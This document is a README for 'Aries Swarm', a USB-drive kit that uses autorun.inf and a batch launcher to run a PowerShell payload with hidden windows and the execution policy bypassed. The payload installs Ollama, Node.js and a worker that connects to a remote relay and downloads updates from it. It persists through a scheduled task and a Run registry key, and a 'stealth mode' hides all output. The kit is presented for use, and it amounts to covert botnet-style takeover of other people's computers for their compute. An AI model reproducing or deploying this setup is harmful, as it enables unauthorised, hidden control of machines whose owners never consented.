# Aries Swarm — USB Drive Deployment

## Preparing a USB Drive

1. **Format** a USB drive (FAT32 or NTFS)
2. **Copy** these files to the root of the drive:
   - `deploy.bat` — Silent launcher
   - `payload.ps1` — Main deployment script
   - `autorun.inf` — Auto-run configuration (works on older Windows)
   - `config.json` — Swarm relay configuration
   - `worker.js` — Worker script (optional, will be downloaded if missing)

## How It Works

When the USB is plugged in:
- On older Windows (XP/7): `autorun.inf` triggers `deploy.bat` automatically
- On modern Windows (10/11): User must open the drive and double-click `deploy.bat`

`deploy.bat` runs `payload.ps1` silently (hidden window, no UAC prompt).

## What Gets Installed

All in `%LOCALAPPDATA%\aries-swarm\` (no admin required):
- **Ollama** — Local AI inference engine
- **Node.js** — Portable runtime (no system install)
- **worker.js** — Swarm worker that connects to your relay
- **Scheduled task** — Auto-starts on login (persists across reboots)

## Stealth Mode

Set environment variable `ARIES_STEALTH=1` before running, or edit `deploy.bat`:
```batch
@echo off & set ARIES_STEALTH=1 & powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0payload.ps1" & exit
```

In stealth mode: no visible windows, no console output, no progress bars.

## Configuration

Edit environment variables in `payload.ps1` or set them before running:
- `ARIES_RELAY` — Swarm relay URL (default: `https://gateway.doomtrader.com:9700`)
- `ARIES_SECRET` — Authentication secret
- `ARIES_WORKER` — URL to download worker.js from
- `ARIES_STEALTH` — Set to `1` for silent deployment

## Updates

If the USB is plugged into a machine that already has Aries deployed (`worker.js` exists),
the script enters **update mode**: re-downloads worker.js, restarts the process, and exits.
No reinstallation of Ollama or Node.js.

## Logs

Check `%LOCALAPPDATA%\aries-swarm\setup.log` for deployment logs.

## Removal

1. Delete scheduled task: `Unregister-ScheduledTask -TaskName AriesSwarmWorker -Confirm:$false`
2. Remove registry key: `Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name AriesSwarmWorker`
3. Delete folder: `Remove-Item -Recurse "$env:LOCALAPPDATA\aries-swarm"`
4. Optionally uninstall Ollama from Settings → Apps
